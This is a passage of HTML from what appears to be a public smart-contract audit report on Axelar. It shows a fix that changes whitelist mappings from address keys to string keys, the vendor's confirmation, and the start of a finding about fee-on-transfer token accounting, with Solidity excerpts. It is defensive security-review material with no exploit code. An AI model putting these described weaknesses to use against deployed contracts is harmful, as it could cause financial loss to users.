class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedCallers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Whitelisted proposal senders. The proposal sender is the `InterchainProposalSender` contract address at the source chain.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedSenders</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Set the proposal caller whitelist status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk3\"> The source chain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">sourceCaller</span><span class=\"mtk3\"> The source caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk3\"> The whitelist status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setWhitelistedProposalCaller</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceCaller</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">whitelistedCallers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">][</span><span class=\"mtk12\">sourceCaller</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WhitelistedProposalCallerSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceCaller</span><span class=\"mtk1\">, </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Set the proposal sender whitelist status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk3\"> The source chain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">sourceSender</span><span class=\"mtk3\"> The source sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk3\"> The whitelist status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setWhitelistedProposalSender</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceSender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">whitelistedSenders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">][</span><span class=\"mtk12\">sourceSender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WhitelistedProposalSenderSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceSender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">whitelisted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t convert <code>sourceAddress</code> to <code>address</code>, use <code>string</code> instead.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Whitelisted proposal callers. The proposal caller is the contract that calls the `InterchainProposalSender` at the source chain.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedCallers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedCallers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Whitelisted proposal senders. The proposal sender is the `InterchainProposalSender` contract address at the source chain.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedSenders</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedSenders</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"assessed-type-8\" style=\"position:relative;\"><a href=\"#assessed-type-8\" aria-label=\"assessed type 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Invalid Validation</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/25#issuecomment-1695951653\">deanamiel (Axelar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Support has been added for non-EVM addresses.</p>\n<p>Public PR links:<br>\n<a href=\"https://github.com/axelarnetwork/interchain-governance-executor/pull/21\">https://github.com/axelarnetwork/interchain-governance-executor/pull/21</a><br>\n<a href=\"https://github.com/axelarnetwork/interchain-governance-executor/pull/33\">https://github.com/axelarnetwork/interchain-governance-executor/pull/33</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-contracts-are-vulnerable-to-fee-on-transfer-accounting-related-issues\" style=\"position:relative;\"><a href=\"#m-10-contracts-are-vulnerable-to-fee-on-transfer-accounting-related-issues\" aria-label=\"m 10 contracts are vulnerable to fee on transfer accounting related issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41\">[M-10] Contracts are vulnerable to fee-on-transfer accounting-related issues</a></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41\">ChaseTheLight</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h3 id=\"resolution\" style=\"position:relative;\"><a href=\"#resolution\" aria-label=\"resolution permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Resolution</h3>\n<p>The below-listed functions use <code>transferFrom()</code> to move funds from the sender to the recipient but fail to verify if the received token amount matches the transferred amount. This could pose an issue with fee-on-transfer tokens, where the post-transfer balance might be less than anticipated, leading to balance inconsistencies. There might be subsequent checks for a second transfer, but an attacker might exploit leftover funds (such as those accidentally sent by another user) to gain unjustified credit. A practical solution is to gauge the balance prior and post-transfer, and consider the differential as the transferred amount, instead of the predefined amount. </p>\n<p>Findings are labeled with <code>&#x3C;= FOUND</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/cgp/AxelarGateway.sol#L542-L546\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/cgp/AxelarGateway.sol#L542-L546</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">529</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_burnTokenFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">530:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">531:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">symbol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">532:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">533</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">534</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">tokenAddresses</span><span class=\"mtk1\">(</span><span class=\"mtk12\">symbol</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">535</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">536</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokenDoesNotExist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">symbol</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">537</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">538</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">539</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">TokenType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenType</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getTokenType</span><span class=\"mtk1\">(</span><span class=\"mtk12\">symbol</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">540</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">541</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenType</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">TokenType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">External</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">542</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// &lt;= FOUND</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">543</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenType</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">TokenType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">InternalBurnableFrom</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">544</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">545</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">546</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">depositAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// &lt;= FOUND</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">547</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IBurnableMintableCappedERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">548</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">549</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L451-L451\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L451-L451</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">439</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expressReceiveToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">440:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">441:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">442:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">443:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">commandId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">444</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isCommandExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">446</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">447</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">caller</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">448</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">ITokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getValidTokenManagerAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">449</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">450</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">451</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">SafeTokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// &lt;= FOUND</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 